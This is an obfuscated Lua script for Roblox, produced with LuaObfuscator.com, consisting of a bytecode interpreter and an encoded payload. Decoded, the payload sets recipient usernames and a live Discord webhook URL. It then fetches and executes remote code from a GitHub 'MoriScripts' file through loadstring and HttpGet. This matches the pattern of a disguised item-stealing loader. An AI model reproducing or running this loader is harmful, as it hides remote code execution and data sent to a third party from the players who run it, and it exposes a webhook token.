--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.12) ~  Much Love, Ferib 

]]--

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 79) then
			local v68 = 0;
			while true do
				if (v68 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v69 = v2(v0(v30, 16));
			if v19 then
				local v81 = v5(v69, v19);
				v19 = nil;
				return v81;
			else
				return v69;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v70 = (v31 / (((1070 - (68 + 997)) - 3) ^ (v32 - (2 - 1)))) % (2 ^ (((v33 - ((1271 - (226 + 1044)) - 0)) - (v32 - (2 - 1))) + ((2699 - 2079) - (555 + 64))));
			return v70 - (v70 % (932 - (857 + 74)));
		else
			local v71 = 568 - (330 + 37 + (318 - (32 + 85)));
			local v72;
			while true do
				if (v71 == (927 - (210 + 4 + 713))) then
					v72 = (1 + 1) ^ (v32 - (1 + 0));
					return (((v31 % (v72 + v72)) >= v72) and ((1251 - 373) - (282 + 595))) or (1637 - (1523 + 114));
				end
			end
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35, v36 = v1(v16, v18, v18 + 1 + 1);
		v18 = v18 + 2;
		return (v36 * (1213 - (892 + 65))) + v35;
	end
	local function v23()
		local v37 = 180 - (67 + 113);
		local v38;
		local v39;
		local v40;
		local v41;
		while true do
			if (v37 == 1) then
				return (v41 * (40022563 - 23245347)) + (v40 * (121138 - 55602)) + (v39 * (469 - (573 - 360))) + v38;
			end
			if (v37 == (350 - (87 + (476 - 213)))) then
				v38, v39, v40, v41 = v1(v16, v18, v18 + 3 + 0);
				v18 = v18 + ((1012 - (915 + 82)) - (31 - 20));
				v37 = (556 + 397) - (802 + 150);
			end
		end
	end
	local function v24()
		local v42 = 0 - 0;
		local v43;
		local v44;
		local v45;
		local v46;
		local v47;
		local v48;
		while true do
			if (v42 == (1188 - (1069 + 118))) then
				v45 = 1;
				v46 = (v20(v44, 2 - 1, (156 - 113) - 23) * ((1 + 1) ^ 32)) + v43;
				v42 = 3 - 1;
			end
			if (v42 == (3 + 0)) then
				if (v47 == (791 - (368 + (1502 - 1079)))) then
					if (v46 == 0) then
						return v48 * (0 - 0);
					else
						v47 = 19 - ((869 - (814 + 45)) + 8);
						v45 = 0 - 0;
					end
				elseif (v47 == (2489 - (416 + 26))) then
					return ((v46 == (0 - 0)) and (v48 * ((1 + 0) / (0 - 0)))) or (v48 * NaN);
				end
				return v8(v48, v47 - (2520 - 1497)) * (v45 + (v46 / ((440 - (145 + 293)) ^ (482 - (44 + 386)))));
			end
			if (v42 == (1486 - (998 + 488))) then
				v43 = v23();
				v44 = v23();
				v42 = 1 + 0;
			end
			if (v42 == 2) then
				v47 = v20(v44, 21, 26 + 1 + 4);
				v48 = ((v20(v44, 804 - (201 + 571)) == (1139 - (116 + 362 + 660))) and -1) or ((889 - (261 + 624)) - 3);
				v42 = 2 + (1 - 0);
			end
		end
	end
	local function v25(v49)
		local v50;
		if not v49 then
			local v73 = 1080 - (1020 + 60);
			while true do
				if (v73 == (1423 - (630 + 793))) then
					v49 = v23();
					if (v49 == (0 - 0)) then
						return "";
					end
					break;
				end
			end
		end
		v50 = v3(v16, v18, (v18 + v49) - (4 - (9 - 6)));
		v18 = v18 + v49;
		local v51 = {};
		for v66 = 1 + 0, #v50 do
			v51[v66] = v2(v1(v3(v50, v66, v66)));
		end
		return v6(v51);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v52 = 0;
		local v53;
		local v54;
		local v55;
		local v56;
		local v57;
		local v58;
		while true do
			if (v52 == 1) then
				local v74 = 0 + 0;
				while true do
					if (0 == v74) then
						v57 = v23();
						v58 = {};
						v74 = 1;
					end
					if (v74 == 2) then
						v52 = 4 - 2;
						break;
					end
					if (v74 == 1) then
						for v100 = 1, v57 do
							local v101 = 0;
							local v102;
							local v103;
							local v104;
							local v105;
							while true do
								if (v101 == (605 - (268 + 335))) then
									while true do
										if (v102 ~= 0) then
										else
											v103 = 290 - (60 + 230);
											v104 = nil;
											v102 = 1;
										end
										if (v102 == 1) then
											v105 = nil;
											while true do
												if (v103 ~= (572 - (426 + 146))) then
												else
													local v159 = 0 + 0;
													local v160;
													while true do
														if (v159 == 0) then
															v160 = 1456 - (282 + 1174);
															while true do
																if (v160 == 0) then
																	local v185 = 0;
																	while true do
																		if (v185 == (811 - (569 + 242))) then
																			v104 = v21();
																			v105 = nil;
																			v185 = 2 - 1;
																		end
																		if (v185 == (1 + 0)) then
																			v160 = 1;
																			break;
																		end
																	end
																end
																if (v160 == 1) then
																	v103 = 1025 - (706 + 318);
																	break;
																end
															end
															break;
														end
													end
												end
												if (v103 ~= 1) then
												else
													if (v104 == 1) then
														v105 = v21() ~= 0;
													elseif (v104 == 2) then
														v105 = v24();
													elseif (v104 ~= (1254 - (721 + 530))) then
													else
														v105 = v25();
													end
													v58[v100] = v105;
													break;
												end
											end
											break;
										end
									end
									break;
								end
								if (v101 ~= (1271 - (945 + 326))) then
								else
									v102 = 0 - 0;
									v103 = nil;
									v101 = 1 + 0;
								end
								if (1 == v101) then
									v104 = nil;
									v105 = nil;
									v101 = 2;
								end
							end
						end
						v56[3] = v21();
						v74 = 702 - (271 + 429);
					end
				end
			end
			if (v52 ~= (0 + 0)) then
			else
				local v75 = 1500 - (1408 + 92);
				while true do
					if (v75 == (1087 - (461 + 625))) then
						v55 = {};
						v56 = {v53,v54,nil,v55};
						v75 = 2;
					end
					if (2 ~= v75) then
					else
						v52 = 1 + 0;
						break;
					end
					if (0 == v75) then
						v53 = {};
						v54 = {};
						v75 = 1172 - (418 + 753);
					end
				end
			end
			if (v52 ~= 2) then
			else
				local v76 = 0;
				local v77;
				while true do
					if (v76 == (0 + 0)) then
						v77 = 0 + 0;
						while true do
							local v106 = 0;
							while true do
								if (v106 ~= (0 + 0)) then
								else
									if (v77 == (1 + 0)) then
										return v56;
									end
									if (v77 == 0) then
										for v118 = 1, v23() do
											local v119 = 0;
											local v120;
											local v121;
											local v122;
											while true do
												if (v119 == (529 - (406 + 123))) then
													v120 = 0;
													v121 = nil;
													v119 = 1;
												end
												if (v119 == 1) then
													v122 = nil;
													while true do
														if ((1769 - (1749 + 20)) ~= v120) then
														else
															local v183 = 0 + 0;
															local v184;
															while true do
																if (v183 ~= (1322 - (1249 + 73))) then
																else
																	v184 = 0 + 0;
																	while true do
																		if (v184 == 0) then
																			local v193 = 1145 - (466 + 679);
																			while true do
																				if (v193 ~= (2 - 1)) then
																				else
																					v184 = 1;
																					break;
																				end
																				if (v193 ~= (0 - 0)) then
																				else
																					v121 = 1900 - (106 + 1794);
																					v122 = nil;
																					v193 = 1 + 0;
																				end
																			end
																		end
																		if (v184 ~= 1) then
																		else
																			v120 = 1 + 0;
																			break;
																		end
																	end
																	break;
																end
															end
														end
														if (v120 ~= (2 - 1)) then
														else
															while true do
																if (v121 ~= (0 - 0)) then
																else
																	v122 = v21();
																	if (v20(v122, 115 - (4 + 110), 1) ~= (584 - (57 + 527))) then
																	else
																		local v186 = 0;
																		local v187;
																		local v188;
																		local v189;
																		local v190;
																		local v191;
																		local v192;
																		while true do
																			if (v186 ~= 1) then
																			else
																				v189 = nil;
																				v190 = nil;
																				v186 = 2;
																			end
																			if (v186 == 3) then
																				while true do
																					if (1 == v187) then
																						v190 = nil;
																						v191 = nil;
																						v187 = 2;
																					end
																					if (v187 ~= 0) then
																					else
																						local v194 = 1427 - (41 + 1386);
																						while true do
																							if (v194 ~= (104 - (17 + 86))) then
																							else
																								v187 = 1 + 0;
																								break;
																							end
																							if (v194 ~= 0) then
																							else
																								v188 = 0 - 0;
																								v189 = nil;
																								v194 = 2 - 1;
																							end
																						end
																					end
																					if (2 ~= v187) then
																					else
																						v192 = nil;
																						while true do
																							if (v188 == (167 - (122 + 44))) then
																								local v195 = 0;
																								while true do
																									if (v195 == 0) then
																										v191 = nil;
																										v192 = nil;
																										v195 = 1 - 0;
																									end
																									if (1 ~= v195) then
																									else
																										v188 = 2;
																										break;
																									end
																								end
																							end
																							if (v188 == (0 - 0)) then
																								local v196 = 0 + 0;
																								local v197;
																								while true do
																									if (v196 == (0 + 0)) then
																										v197 = 0;
																										while true do
																											if (0 ~= v197) then
																											else
																												local v208 = 0;
																												while true do
																													if (1 ~= v208) then
																													else
																														v197 = 1;
																														break;
																													end
																													if (0 ~= v208) then
																													else
																														v189 = 0;
																														v190 = nil;
																														v208 = 1 - 0;
																													end
																												end
																											end
																											if (v197 == (66 - (30 + 35))) then
																												v188 = 1;
																												break;
																											end
																										end
																										break;
																									end
																								end
																							end
																							if (v188 == 2) then
																								while true do
																									if (v189 ~= (1 + 0)) then
																									else
																										local v198 = 1257 - (1043 + 214);
																										local v199;
																										while true do
																											if (v198 ~= 0) then
																											else
																												v199 = 0 - 0;
																												while true do
																													if (v199 ~= (1212 - (323 + 889))) then
																													else
																														v192 = {v22(),v22(),nil,nil};
																														if (v190 == (320 - (53 + 267))) then
																															local v210 = 0 + 0;
																															local v211;
																															while true do
																																if (v210 ~= (413 - (15 + 398))) then
																																else
																																	v211 = 0;
																																	while true do
																																		if (v211 ~= (982 - (18 + 964))) then
																																		else
																																			v192[11 - 8] = v22();
																																			v192[4] = v22();
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														elseif (v190 == (1 + 0)) then
																															v192[3] = v23();
																														elseif (v190 == 2) then
																															v192[3] = v23() - ((2 + 0) ^ (866 - (20 + 830)));
																														elseif (v190 ~= (3 + 0)) then
																														else
																															local v218 = 126 - (116 + 10);
																															while true do
																																if ((0 + 0) == v218) then
																																	v192[741 - (542 + 196)] = v23() - ((3 - 1) ^ (5 + 11));
																																	v192[3 + 1] = v22();
																																	break;
																																end
																															end
																														end
																														v199 = 1;
																													end
																													if (v199 ~= 1) then
																													else
																														v189 = 1 + 1;
																														break;
																													end
																												end
																												break;
																											end
																										end
																									end
																									if (v189 == 3) then
																										if (v20(v191, 3, 7 - 4) ~= 1) then
																										else
																											v192[9 - 5] = v58[v192[1555 - (1126 + 425)]];
																										end
																										v53[v118] = v192;
																										break;
																									end
																									if (v189 ~= 2) then
																									else
																										local v201 = 0;
																										local v202;
																										local v203;
																										while true do
																											if (0 == v201) then
																												v202 = 0;
																												v203 = nil;
																												v201 = 1;
																											end
																											if (v201 ~= 1) then
																											else
																												while true do
																													if (v202 ~= (405 - (118 + 287))) then
																													else
																														v203 = 0;
																														while true do
																															if (1 ~= v203) then
																															else
																																v189 = 3;
																																break;
																															end
																															if ((0 - 0) ~= v203) then
																															else
																																local v212 = 0;
																																while true do
																																	if ((1122 - (118 + 1003)) == v212) then
																																		v203 = 2 - 1;
																																		break;
																																	end
																																	if (v212 == (377 - (142 + 235))) then
																																		local v215 = 0;
																																		while true do
																																			if (0 ~= v215) then
																																			else
																																				if (v20(v191, 4 - 3, 1) == (1 + 0)) then
																																					v192[979 - (553 + 424)] = v58[v192[2]];
																																				end
																																				if (v20(v191, 2, 2) == 1) then
																																					v192[3] = v58[v192[3]];
																																				end
																																				v215 = 1;
																																			end
																																			if (v215 == (1 - 0)) then
																																				v212 = 1;
																																				break;
																																			end
																																		end
																																	end
																																end
																															end
																														end
																														break;
																													end
																												end
																												break;
																											end
																										end
																									end
																									if (v189 == 0) then
																										local v204 = 0;
																										local v205;
																										while true do
																											if (0 ~= v204) then
																											else
																												v205 = 0;
																												while true do
																													if (v205 ~= (1 + 0)) then
																													else
																														v189 = 1;
																														break;
																													end
																													if (v205 == 0) then
																														local v209 = 0 + 0;
																														while true do
																															if (v209 == (0 + 0)) then
																																v190 = v20(v122, 2, 2 + 1);
																																v191 = v20(v122, 4, 6);
																																v209 = 1 + 0;
																															end
																															if (v209 ~= (2 - 1)) then
																															else
																																v205 = 2 - 1;
																																break;
																															end
																														end
																													end
																												end
																												break;
																											end
																										end
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																				end
																				break;
																			end
																			if (v186 == (0 - 0)) then
																				v187 = 0;
																				v188 = nil;
																				v186 = 1 + 0;
																			end
																			if (v186 ~= (9 - 7)) then
																			else
																				v191 = nil;
																				v192 = nil;
																				v186 = 3;
																			end
																		end
																	end
																	break;
																end
															end
															break;
														end
													end
													break;
												end
											end
										end
										for v123 = 754 - (239 + 514), v23() do
											v54[v123 - 1] = v28();
										end
										v77 = 1 + 0;
									end
									break;
								end
							end
						end
						break;
					end
				end
			end
		end
	end
	local function v29(v59, v60, v61)
		local v62 = 0;
		local v63;
		local v64;
		local v65;
		while true do
			if (v62 == 1) then
				v65 = v59[3];
				return function(...)
					local v82 = v63;
					local v83 = v64;
					local v84 = v65;
					local v85 = v27;
					local v86 = 1;
					local v87 = -1;
					local v88 = {};
					local v89 = {...};
					local v90 = v12("#", ...) - 1;
					local v91 = {};
					local v92 = {};
					for v96 = 0, v90 do
						if (v96 >= v84) then
							v88[v96 - v84] = v89[v96 + 1];
						else
							v92[v96] = v89[v96 + 1];
						end
					end
					local v93 = (v90 - v84) + 1;
					local v94;
					local v95;
					while true do
						v94 = v82[v86];
						v95 = v94[1];
						if (v95 <= 6) then
							if (v95 <= 2) then
								if (v95 <= 0) then
									v92[v94[2]] = v61[v94[3]];
								elseif (v95 > 1) then
									local v125;
									local v126, v127;
									local v128;
									local v129;
									v92[v94[2]] = v61[v94[3]];
									v86 = v86 + 1;
									v94 = v82[v86];
									v129 = v94[2];
									v128 = v92[v94[3]];
									v92[v129 + 1] = v128;
									v92[v129] = v128[v94[4]];
									v86 = v86 + 1;
									v94 = v82[v86];
									v92[v94[2]] = v94[3];
									v86 = v86 + 1;
									v94 = v82[v86];
									v92[v94[2]] = v94[3] ~= 0;
									v86 = v86 + 1;
									v94 = v82[v86];
									v129 = v94[2];
									v126, v127 = v85(v92[v129](v13(v92, v129 + 1, v94[3])));
									v87 = (v127 + v129) - 1;
									v125 = 0;
									for v153 = v129, v87 do
										local v154 = 0;
										while true do
											if (v154 == 0) then
												v125 = v125 + 1;
												v92[v153] = v126[v125];
												break;
											end
										end
									end
									v86 = v86 + 1;
									v94 = v82[v86];
									v129 = v94[2];
									v92[v129] = v92[v129](v13(v92, v129 + 1, v87));
									v86 = v86 + 1;
									v94 = v82[v86];
									v92[v94[2]]();
									v86 = v86 + 1;
									v94 = v82[v86];
									v86 = v94[3];
								else
									v92[v94[2]]();
								end
							elseif (v95 <= 4) then
								if (v95 == 3) then
									v92[v94[2]][v94[3]] = v94[4];
								else
									v61[v94[3]] = v92[v94[2]];
								end
							elseif (v95 > 5) then
								v92[v94[2]] = v94[3] ~= 0;
							elseif (v92[v94[2]] == v94[4]) then
								v86 = v86 + 1;
							else
								v86 = v94[3];
							end
						elseif (v95 <= 9) then
							if (v95 <= 7) then
								local v113 = 0;
								local v114;
								local v115;
								local v116;
								local v117;
								while true do
									if (v113 == 2) then
										for v157 = v114, v87 do
											local v158 = 0;
											while true do
												if (v158 == 0) then
													v117 = v117 + 1;
													v92[v157] = v115[v117];
													break;
												end
											end
										end
										break;
									end
									if (v113 == 0) then
										v114 = v94[2];
										v115, v116 = v85(v92[v114](v13(v92, v114 + 1, v94[3])));
										v113 = 1;
									end
									if (v113 == 1) then
										v87 = (v116 + v114) - 1;
										v117 = 0;
										v113 = 2;
									end
								end
							elseif (v95 > 8) then
								local v144 = 0;
								while true do
									if (v144 == 0) then
										v61[v94[3]] = v92[v94[2]];
										v86 = v86 + 1;
										v94 = v82[v86];
										v92[v94[2]] = v61[v94[3]];
										v144 = 1;
									end
									if (v144 == 3) then
										v86 = v94[3];
										break;
									end
									if (v144 == 2) then
										v94 = v82[v86];
										v92[v94[2]] = v94[3];
										v86 = v86 + 1;
										v94 = v82[v86];
										v144 = 3;
									end
									if (v144 == 1) then
										v86 = v86 + 1;
										v94 = v82[v86];
										v92[v94[2]][v94[3]] = v94[4];
										v86 = v86 + 1;
										v144 = 2;
									end
								end
							else
								local v145 = 0;
								local v146;
								local v147;
								while true do
									if (v145 == 0) then
										v146 = v94[2];
										v147 = v92[v94[3]];
										v145 = 1;
									end
									if (v145 == 1) then
										v92[v146 + 1] = v147;
										v92[v146] = v147[v94[4]];
										break;
									end
								end
							end
						elseif (v95 <= 11) then
							if (v95 == 10) then
								v92[v94[2]] = v94[3];
							else
								do
									return;
								end
							end
						elseif (v95 > 12) then
							local v150 = 0;
							local v151;
							while true do
								if (v150 == 0) then
									v151 = v94[2];
									v92[v151] = v92[v151](v13(v92, v151 + 1, v87));
									break;
								end
							end
						else
							v86 = v94[3];
						end
						v86 = v86 + 1;
					end
				end;
			end
			if (0 == v62) then
				v63 = v59[1];
				v64 = v59[2];
				v62 = 1;
			end
		end
	end
	return v29(v28(), {}, v17)(...);
end
v15("LOL!133O00028O00027O004003023O005F4703093O00416E74694C656176652O0103093O004D6F7573654C6F636B026O00084003083O00557365724E616D65030B3O007265636F6E76657274657203073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3133323734313338323331303733313930372F2D4E6B364E2D4D69622O336F55436C48305A635751796F37652O5579535F7944637A4F76467A42797357586B4A77344D34624E492O315646484957596845767251525453026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F4D6F7269536372697074732F6D61696E2F4D6F72695363726970745A03093O00557365724E616D653203083O0073686172706C7578030D3O004C6F6164696E675363722O656E00233O00120A3O00013O0026053O00080001000200040C3O0008000100122O000100033O00300300010004000500122O000100033O00300300010006000500120A3O00073O0026053O000F0001000100040C3O000F000100120A000100093O001204000100083O00120A0001000B3O0012040001000A3O00120A3O000C3O0026053O001A0001000700040C3O001A000100122O0001000D3O0012020002000E3O00202O00020002000F00122O000400106O000500016O000200056O00013O00024O00010001000100044O002200010026053O00010001000C00040C3O0001000100120A000100123O001209000100113O00122O000100033O00302O00010013000500124O00023O00044O000100012O000B3O00017O00", v9(), ...);
